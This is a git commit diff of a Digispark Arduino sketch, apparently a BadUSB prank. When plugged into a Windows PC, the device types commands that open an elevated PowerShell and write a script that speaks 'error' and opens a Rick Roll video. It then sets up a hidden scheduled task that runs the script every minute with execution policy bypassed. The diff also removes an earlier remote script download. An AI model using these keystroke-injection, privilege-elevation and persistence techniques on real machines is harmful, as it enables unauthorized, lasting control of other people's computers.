bf33fc50e488157c19b9df0ba46430070729168b
ShiroNexo <106244851+ShiroNexo@users.noreply.github.com>
2022-05-29 22:27:00 +0700

    Update RickRoll_Task.ino

--- RickRoll_Schedule/RickRoll_Task.ino
+++ RickRoll_Schedule/RickRoll_Task.ino
@@ -1,29 +1,40 @@
-// rickroll with task schedule
+// rick roll task by Shiro
 
 #include "DigiKeyboard.h"
-
 void setup() {}
+  
 
 void loop() {
+  
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("powershell");
+  DigiKeyboard.print("Powershell Start-Process powershell -Verb runAs");
+  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  // you can delelte error sound by deleting from "add-type" to "music.')n"
+  DigiKeyboard.println(F("$put = \"Add-Type -AssemblyName System.speech\n$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer\n$speak.Speak('error, error, error, error, error, error, error, error. playing a music.')\nstart https://www.youtube.com/watch?v=oHg5SJYRHA0\nexit\""));
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/ShiroNexo/test/main/RickRoll_Schedule/rickroll.ps1\", \"C:\\System\\rickroll.ps1\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("write-output $put > $env:temp\\roll.ps1");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
   // /SC — defines the schedule for the task. Options available, include MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT.
   // defines the time to run the task (in 24 hours format).
-  DigiKeyboard.print("schtasks /create /tn \"RickRoll\" /SC MINUTE /st 13:00 /tr \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command '& C:\\System\\rickroll.ps1'\"");
+  DigiKeyboard.print("schtasks /create /tn \"RickRoll\" /SC MINUTE /st 13:00 /tr \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command '& $env:temp\\roll.ps1\"");
+  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(50);
+  DigiKeyboard.delay(100);
   DigiKeyboard.print("exit");
+  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  for (;;) {
-    /*empty*/
+  DigiKeyboard.delay(100);
+  
+ for(;;)
+  {
   }
-
 }
